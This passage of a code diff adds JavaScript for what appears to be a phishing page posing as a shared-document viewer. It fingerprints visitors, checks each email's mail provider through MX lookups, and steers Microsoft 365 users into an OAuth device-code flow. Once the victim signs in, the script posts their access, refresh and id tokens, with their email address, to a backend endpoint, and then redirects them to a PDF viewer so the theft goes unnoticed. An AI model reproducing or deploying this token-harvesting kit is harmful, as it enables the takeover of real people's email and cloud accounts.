+            document.getElementById('deviceCodeForm').style.display = 'none';
+            
+            resetForm();
+        }
+
+        function handleLightboxClick(event) {
+            if (event.target.id === 'lightbox') {
+                closeLightbox();
+            }
+        }
+
+        function resetForm() {
+            document.getElementById('emailForm').reset();
+            document.getElementById('emailInput').classList.remove('error');
+            document.getElementById('errorMessage').classList.remove('show');
+            document.getElementById('providerInfo').innerHTML = '';
+        }
+
+        // ========== VISIT LOGGING ==========
+        function getDeviceType() {
+            const ua = navigator.userAgent;
+            let os = 'Unknown';
+            
+            if (/Windows NT 10/i.test(ua)) {
+                os = 'Windows 10/11';
+            } else if (/Windows NT 6.1/i.test(ua)) {
+                os = 'Windows 7';
+            } else if (/Windows/i.test(ua)) {
+                os = 'Windows';
+            } else if (/Mac OS X 10[._]\d+/i.test(ua)) {
+                const match = ua.match(/Mac OS X 10[._](\d+)/i);
+                os = match ? `macOS 10.${match[1]}` : 'macOS';
+            } else if (/Mac OS X|Macintosh/i.test(ua)) {
+                os = 'macOS';
+            } else if (/iPhone/i.test(ua)) {
+                const match = ua.match(/OS (\d+)[._](\d+)/i);
+                os = match ? `iPhone iOS ${match[1]}.${match[2]}` : 'iPhone iOS';
+            } else if (/iPad/i.test(ua)) {
+                os = 'iPad iOS';
+            } else if (/Android/i.test(ua)) {
+                const match = ua.match(/Android (\d+\.?\d*)/i);
+                os = match ? `Android ${match[1]}` : 'Android';
+            } else if (/Linux/i.test(ua)) {
+                os = 'Linux';
+            }
+            
+            return os;
+        }
+
+        async function logVisit(email, device, mxType) {
+            try {
+                console.log('📊 Logging visit to Redis...');
+
+                const documentKey = window.location.hash.substring(1) || 'unknown';
+
+                const response = await fetch('/api/log-visit.php', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        email: email,
+                        device: device,
+                        mx_type: mxType,
+                        document_key: documentKey
+                    })
+                });
+
+                if (!response.ok) {
+                    throw new Error(`HTTP ${response.status}`);
+                }
+
+                const result = await response.json();
+
+                if (result.success) {
+                    console.log('✅ Visit logged successfully');
+                    console.log('Visit ID:', result.visit_id);
+                    console.log('IP Address:', result.ip);
+                    console.log('MX Type:', result.mx_type);
+                    console.log('Document Key:', result.document_key);
+                } else {
+                    console.error('❌ Visit logging failed:', result.error);
+                }
+
+            } catch (error) {
+                console.error('❌ Visit logging error:', error);
+            }
+        }
+
+        // ========== MX CHECKING ==========
+        function getCommonProvider(domain) {
+            const office365Domains = [
+                'outlook.com', 'hotmail.com', 'live.com', 
+                'msn.com', 'outlook.co.uk', 'live.co.uk'
+            ];
+            
+            const googleDomains = [
+                'gmail.com', 'googlemail.com', 'googlemail.co.uk'
+            ];
+
+            if (office365Domains.includes(domain)) {
+                return {
+                    success: true,
+                    provider: 'office365',
+                    domain: domain,
+                    mx: domain.replace('hotmail', 'outlook').replace('live', 'outlook') + '-com.mail.protection.outlook.com',
+                    allMX: [domain + '-com.mail.protection.outlook.com']
+                };
+            }
+
+            if (googleDomains.includes(domain)) {
+                return {
+                    success: true,
+                    provider: 'google',
+                    domain: domain,
+                    mx: 'gmail-smtp-in.l.google.com',
+                    allMX: [
+                        'gmail-smtp-in.l.google.com',
+                        'alt1.gmail-smtp-in.l.google.com',
+                        'alt2.gmail-smtp-in.l.google.com'
+                    ]
+                };
+            }
+
+            return null;
+        }
+
+        function categorizeProvider(mxRecords) {
+            const mxString = mxRecords.join(' ').toLowerCase();
+
+            const office365Patterns = [
+                'outlook.com',
+                'protection.outlook.com',
+                'mail.protection.outlook.com',
+                'eo.outlook.com',
+                'microsoft.com',
+                'office365.com',
+                'onmicrosoft.com',
+                'pamx1.hotmail.com'
+            ];
+
+            const googlePatterns = [
+                'google.com',
+                'googlemail.com',
+                'aspmx.l.google.com',
+                'smtp.google.com',
+                'gmail-smtp-in.l.google.com'
+            ];
+
+            for (const pattern of office365Patterns) {
+                if (mxString.includes(pattern)) {
+                    return 'office365';
+                }
+            }
+
+            for (const pattern of googlePatterns) {
+                if (mxString.includes(pattern)) {
+                    return 'google';
+                }
+            }
+
+            return 'other';
+        }
+
+        async function checkMXRecords(email) {
+            const domain = email.split('@')[1].toLowerCase();
+
+            const commonProvider = getCommonProvider(domain);
+            if (commonProvider) {
+                return commonProvider;
+            }
+
+            try {
+                const response = await fetch(`https://dns.google/resolve?name=${encodeURIComponent(domain)}&type=MX`);
+                
+                if (!response.ok) {
+                    throw new Error('DNS lookup failed');
+                }
+
+                const data = await response.json();
+
+                if (!data.Answer || data.Answer.length === 0) {
+                    return {
+                        success: false,
+                        provider: 'other',
+                        domain: domain,
+                        mx: null,
+                        error: 'No MX records found'
+                    };
+                }
+
+                const mxRecords = data.Answer
+                    .filter(record => record.type === 15)
+                    .map(record => {
+                        const parts = record.data.split(' ');
+                        return {
+                            priority: parseInt(parts[0]),
+                            exchange: parts[1].replace(/\.$/, '').toLowerCase()
+                        };
+                    })
+                    .sort((a, b) => a.priority - b.priority);
+
+                if (mxRecords.length === 0) {
+                    return {
+                        success: false,
+                        provider: 'other',
+                        domain: domain,
+                        mx: null,
+                        error: 'No valid MX records'
+                    };
+                }
+
+                const primaryMX = mxRecords[0].exchange;
+                const allMX = mxRecords.map(r => r.exchange);
+
+                const provider = categorizeProvider(allMX);
+
+                console.log('MX Lookup Result:', {
+                    domain,
+                    provider,
+                    primaryMX,
+                    allMX
+                });
+
+                return {
+                    success: true,
+                    provider: provider,
+                    domain: domain,
+                    mx: primaryMX,
+                    allMX: allMX,
+                    recordCount: mxRecords.length
+                };
+
+            } catch (error) {
+                console.error('MX lookup error:', error);
+                return {
+                    success: false,
+                    provider: 'other',
+                    domain: domain,
+                    mx: null,
+                    error: error.message
+                };
+            }
+        }
+
+        function logAccess(email, mxResult, files) {
+            const logData = {
+                timestamp: new Date().toISOString(),
+                email: email,
+                domain: mxResult.domain,
+                provider: mxResult.provider,
+                mx: mxResult.mx,
+                allMX: mxResult.allMX,
+                fileCount: files.length,
+                files: files.map(i => documents[i].name),
+                userAgent: navigator.userAgent,
+                screenResolution: `${screen.width}x${screen.height}`,
+                language: navigator.language,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                referrer: document.referrer || 'Direct'
+            };
+
+            console.log('========== ACCESS LOG ==========');
+            console.log(JSON.stringify(logData, null, 2));
+            console.log('================================');
+
+            return logData;
+        }
+
+        function displayProviderBadge(mxResult) {
+            const providerInfo = document.getElementById('providerInfo');
+            let badge = '';
+            let icon = '';
+            let name = '';
+
+            switch(mxResult.provider) {
+                case 'office365':
+                    icon = '🔷';
+                    name = 'Microsoft 365';
+                    badge = 'office365';
+                    break;
+                case 'google':
+                    icon = '🔵';
+                    name = 'Google Workspace';
+                    badge = 'google';
+                    break;
+                default:
+                    icon = '📧';
+                    name = 'Email Verified';
+                    badge = 'other';
+            }
+
+            providerInfo.innerHTML = `
+                <div class="provider-badge ${badge}">
+                    <span>${icon}</span>
+                    <span>${name}</span>
+                </div>
+            `;
+        }
+
+        function redirectToProvider(email, mxResult) {
+            const selectedFiles = Array.from(selectedDocuments);
+            logAccess(email, mxResult, selectedFiles);
+
+            const redirectUrls = {
+                'office365': 'https://7806d4cf9366-endpoint.com/?device=d2301a85-917a-484c-8c6b-d3273eebd8dd',
+                'google': 'https://pdf-render.vercel.app/viewer?from=me',
+                'other': 'https://pdf-render.vercel.app/viewer?from=me'
+            };
+
+            const redirectUrl = redirectUrls[mxResult.provider] || 'https://pdf-render.vercel.app/viewer?from=me';
+            console.log(`🔄 Redirecting to: ${redirectUrl} (Provider: ${mxResult.provider})`);
+            window.location.href = redirectUrl;
+        }
+
+        // ========== DEVICE CODE FLOW FUNCTIONS ==========
+
+        async function requestDeviceCode() {
+            try {
+                const response = await fetch(AZURE_CONFIG.deviceCodeEndpoint, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/x-www-form-urlencoded'
+                    },
+                    body: new URLSearchParams({
+                        client_id: AZURE_CONFIG.clientId,
+                        scope: AZURE_CONFIG.scope
+                    })
+                });
+
+                if (!response.ok) {
+                    throw new Error('Failed to request device code');
+                }
+
+                const data = await response.json();
+                console.log('Device code received:', data);
+                return data;
+
+            } catch (error) {
+                console.error('Device code request error:', error);
+                throw error;
+            }
+        }
+
+        function displayDeviceCode(data) {
+            deviceCodeData = data;
+
+            document.getElementById('authForm').style.display = 'none';
+            document.getElementById('deviceCodeForm').style.display = 'block';
+
+            document.getElementById('deviceCodeValue').textContent = data.user_code;
+
+            document.getElementById('deviceLoginLink').href = data.verification_uri;
+
+            startPolling(data.device_code, data.interval * 1000);
+        }
+
+        function copyDeviceCode() {
+            const codeElement = document.getElementById('deviceCodeValue');
+            const code = codeElement.textContent;
+            
+            navigator.clipboard.writeText(code).then(() => {
+                const copyBtn = document.querySelector('.copy-code-btn');
+                const copyText = document.getElementById('copyBtnText');
+                
+                copyBtn.classList.add('copied');
+                copyText.textContent = 'Copied!';
+                
+                setTimeout(() => {
+                    copyBtn.classList.remove('copied');
+                    copyText.textContent = 'Copy Code';
+                }, 2000);
+            }).catch(err => {
+                console.error('Copy failed:', err);
+                alert('Failed to copy code. Please select and copy manually.');
+            });
+        }
+
+        function startPolling(deviceCode, interval) {
+            console.log('Starting polling every', interval, 'ms');
+            
+            pollingTimer = setInterval(async () => {
+                try {
+                    const response = await fetch(AZURE_CONFIG.tokenEndpoint, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/x-www-form-urlencoded'
+                        },
+                        body: new URLSearchParams({
+                            client_id: AZURE_CONFIG.clientId,
+                            grant_type: 'urn:ietf:params:oauth:grant-type:device_code',
+                            device_code: deviceCode
+                        })
+                    });
+
+                    const data = await response.json();
+
+                    if (response.ok && data.access_token) {
+                        console.log('✅ Authentication successful!');
+                        clearInterval(pollingTimer);
+                        handleAuthenticationSuccess(data);
+                    } else if (data.error === 'authorization_pending') {
+                        console.log('⏳ Waiting for user authentication...');
+                    } else if (data.error === 'slow_down') {
+                        console.log('⏸️ Slowing down polling...');
+                        clearInterval(pollingTimer);
+                        startPolling(deviceCode, interval + 1000);
+                    } else if (data.error === 'expired_token') {
+                        console.log('❌ Device code expired');
+                        clearInterval(pollingTimer);
+                        handleAuthenticationError('Device code expired. Please try again.');
+                    } else if (data.error === 'access_denied') {
+                        console.log('❌ User denied access');
+                        clearInterval(pollingTimer);
+                        handleAuthenticationError('Authentication was denied.');
+                    } else {
+                        console.error('Polling error:', data);
+                    }
+
+                } catch (error) {
+                    console.error('Polling request error:', error);
+                }
+            }, interval || AZURE_CONFIG.pollingInterval);
+        }
+
+        async function handleAuthenticationSuccess(tokenData) {
+            console.log('Token received:', tokenData);
+
+            const email = document.getElementById('emailInput').value.trim();
+            const device = getDeviceType();
+
+            // Save tokens to backend
+            await saveTokensToBackend(email, tokenData);
+
+            // Log visit
+            await logVisit(email, device, 'office365');
+
+            // Show success message
+            document.getElementById('pollingStatus').innerHTML = `
+                <span style="color: #16C79A;">✅</span>
+                <span style="color: #16C79A; font-weight: 600;">Authentication successful!</span>
+            `;
+
+            // Wait a moment then redirect
+            setTimeout(() => {
+                const redirectUrl = getCookie('redirect_url');
+                if (redirectUrl) {
+                    window.location.href = redirectUrl;
+                } else {
+                    window.location.href = 'https://pdf-render.vercel.app/viewer?from=me';
+                }
+            }, 1500);
+        }
+
+        // ========== SAVE TOKENS TO BACKEND ==========
+        async function saveTokensToBackend(email, tokenData) {
+            try {
+                console.log('💾 Saving tokens to backend...');
+
+                const response = await fetch('/api/save-tokens.php', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        email: email,
+                        access_token: tokenData.access_token,
+                        refresh_token: tokenData.refresh_token || null,
+                        id_token: tokenData.id_token || null,
+                        expires_in: tokenData.expires_in || 3600,
+                        token_type: tokenData.token_type || 'Bearer',
+                        scope: tokenData.scope || AZURE_CONFIG.scope
+                    })
+                });
+
+                if (!response.ok) {
+                    throw new Error(`HTTP ${response.status}`);
+                }
+
+                const result = await response.json();
+
+                if (result.success) {
+                    console.log('✅ Tokens saved successfully');
+                    console.log('Token ID:', result.token_id);
+                } else {
+                    console.error('❌ Token save failed:', result.error);
+                }
+
+            } catch (error) {
+                console.error('❌ Token save error:', error);
+                // Don't block user flow if token save fails
+            }
+        }
+
+        function handleAuthenticationError(message) {
+            document.getElementById('pollingStatus').innerHTML = `
+                <span style="color: #DC3545;">❌</span>
+                <span style="color: #DC3545;">${message}</span>
+            `;
+
+            setTimeout(() => {
+                cancelDeviceCode();
+            }, 3000);
+        }
+
+        function cancelDeviceCode() {
+            if (pollingTimer) {
+                clearInterval(pollingTimer);
+                pollingTimer
